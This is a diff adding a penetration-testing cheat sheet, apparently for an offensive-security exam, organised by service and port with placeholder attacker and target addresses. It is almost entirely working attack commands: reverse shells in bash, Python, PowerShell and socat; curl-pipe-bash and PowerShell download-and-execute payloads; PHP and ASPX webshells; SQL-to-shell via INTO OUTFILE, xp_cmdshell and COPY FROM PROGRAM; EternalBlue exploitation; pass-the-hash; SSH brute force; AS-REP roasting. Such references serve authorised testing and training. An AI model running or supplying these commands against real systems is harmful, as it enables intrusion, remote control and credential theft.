@@ -1,0 +1,109 @@
+# === SHELL STABILISATION ===
+# Always run immediately after getting any shell
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+script /dev/null -c bash
+perl -e 'exec "/bin/bash";'
+# Full TTY upgrade after pty spawn
+stty raw -echo; fg
+export TERM=xterm
+stty rows 50 cols 200
+
+# === REVERSE SHELL ONE-LINERS ===
+# Kali listener first
+rlwrap nc -nvlp {{KALI_PORT}}
+# Bash
+bash -i >& /dev/tcp/{{KALI}}/{{KALI_PORT}} 0>&1
+# Bash via curl (most reliable for webshells)
+curl http://{{KALI}}:{{KALI_PORT}}/shell.sh | bash
+# Python3
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{{KALI}}",{{KALI_PORT}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
+# PowerShell (Windows)
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{{KALI}}',{{KALI_PORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+# Socat (best TTY - if available on target)
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{{KALI}}:{{KALI_PORT}}
+
+# === WEB: WEBSHELL DELIVERY (ports 80/443/8080/8443) ===
+# Serve shell.sh from Kali
+printf '#!/bin/bash\nbash -i >& /dev/tcp/{{KALI}}/{{KALI_PORT}} 0>&1\n' > /tmp/shell.sh
+python3 -m http.server {{KALI_PORT}}
+# Trigger webshell via URL
+curl "http://{{TARGET}}/shell.php?cmd=curl+http://{{KALI}}:{{KALI_PORT}}/shell.sh|bash"
+# Common webshell locations to try
+curl "http://{{TARGET}}/uploads/shell.php?cmd=id"
+curl "http://{{TARGET}}/shell.php?cmd=id"
+# PHP webshell (upload via file upload or write via SQLi)
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+# ASPX webshell (Windows IIS targets)
+echo '<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe","/c powershell IEX(New-Object Net.WebClient).DownloadString(\"http://{{KALI}}:{{KALI_PORT}}/shell.ps1\")"); %>' > shell.aspx
+
+# === WEB: SQLI TO SHELL (ports 80/443/8080/8443) ===
+# MySQL - write webshell if FILE privilege and writable web root
+SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
+# MSSQL - xp_cmdshell
+EXEC xp_cmdshell 'powershell IEX(New-Object Net.WebClient).DownloadString("http://{{KALI}}:{{KALI_PORT}}/shell.ps1")';
+# PostgreSQL - COPY FROM PROGRAM
+COPY cmd FROM PROGRAM 'bash -i >& /dev/tcp/{{KALI}}/{{KALI_PORT}} 0>&1';
+
+# === SMB: ETERNALBLUE MS17-010 (ports 139/445) ===
+# Check first
+nmap -sV -p 445 --script smb-vuln-ms17-010 {{TARGET}}
+# Exploit - AutoBlue
+git clone https://github.com/3ndG4me/AutoBlue-MS17-010
+cd AutoBlue-MS17-010 && pip install -r requirements.txt
+python3 eternal_target_2.py {{TARGET}}
+# Metasploit (use sparingly - once per exam)
+msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {{TARGET}}; set LHOST {{KALI}}; set LPORT {{KALI_PORT}}; run"
+
+# === SMB: PSEXEC / CREDENTIAL REUSE (ports 139/445) ===
+# If you have credentials from anywhere - try immediately
+impacket-psexec {{DOMAIN}}/{{USER}}:{{PASS}}@{{TARGET}}
+impacket-psexec {{DOMAIN}}/{{USER}}@{{TARGET}} -hashes :{{NTLM_HASH}}
+crackmapexec smb {{TARGET}} -u {{USER}} -p {{PASS}} -x "whoami"
+
+# === SSH: CREDENTIAL / KEY REUSE (port 22) ===
+# Try credentials found elsewhere first
+ssh {{USER}}@{{TARGET}}
+ssh -i {{KEY_FILE}} {{USER}}@{{TARGET}}
+# Default credentials to try
+ssh root@{{TARGET}}
+ssh admin@{{TARGET}}
+# Brute force if nothing else
+hydra -l {{USER}} -P /usr/share/wordlists/rockyou.txt {{TARGET}} -t 4 ssh
+
+# === RDP: CREDENTIAL REUSE (port 3389) ===
+xfreerdp3 /cert-ignore /u:{{USER}} /p:{{PASS}} /v:{{TARGET}}
+xfreerdp3 /cert-ignore /u:{{USER}} /d:{{DOMAIN}} /p:{{PASS}} /v:{{TARGET}} /drive:share,/home/kali/share
+# Pass the hash via RDP
+xfreerdp3 /cert-ignore /u:{{USER}} /d:{{DOMAIN}} /pth:{{NTLM_HASH}} /v:{{TARGET}}
+
+# === WINRM: CREDENTIAL REUSE (ports 5985/5986) ===
+evil-winrm -I {{TARGET}} -u {{USER}} -p {{PASS}}
+evil-winrm -I {{TARGET}} -u {{USER}} -H {{NTLM_HASH}}
+crackmapexec winrm {{TARGET}} -u {{USER}} -p {{PASS}}
+
+# === MSSQL: CODE EXECUTION (port 1433) ===
+# Enable and use xp_cmdshell
+impacket-mssqlclient {{DOMAIN}}/{{USER}}:{{PASS}}@{{TARGET}} -windows-auth
+EXEC SP_CONFIGURE 'show advanced options', 1; RECONFIGURE;
+EXEC SP_CONFIGURE 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'powershell IEX(New-Object Net.WebClient).DownloadString("http://{{KALI}}:{{KALI_PORT}}/shell.ps1")';
+
+# === MYSQL: FILE WRITE TO SHELL (port 3306) ===
+mysql -h {{TARGET}} -u root -p
+SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
+
+# === NFS: DIRECT MOUNT (port 2049) ===
+showmount -e {{TARGET}}
+mkdir /tmp/nfs && mount -t nfs -o vers=4 {{TARGET}}:/ /tmp/nfs
+# Check for SSH keys, readable files, writable locations
+
+# === SNMP: CONFIG DISCLOSURE (port 161) ===
+# Often leaks credentials, internal IPs, or config details leading to foothold
+snmpwalk -c public -v1 {{TARGET}} | grep -iE "pass|cred|user|key|secret"
+snmpwalk -v1 -c public {{TARGET}} NET-SNMP-EXTEND-MIB::nsExtendOutputFull
+
+# === KERBEROS: PRE-AUTH ATTACKS (port 88) ===
+# AS-REP roast without credentials
+impacket-GetNPUsers -dc-ip {{TARGET}} -request -usersfile users.txt {{DOMAIN}}
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
+# Then use cracked password to authenticate
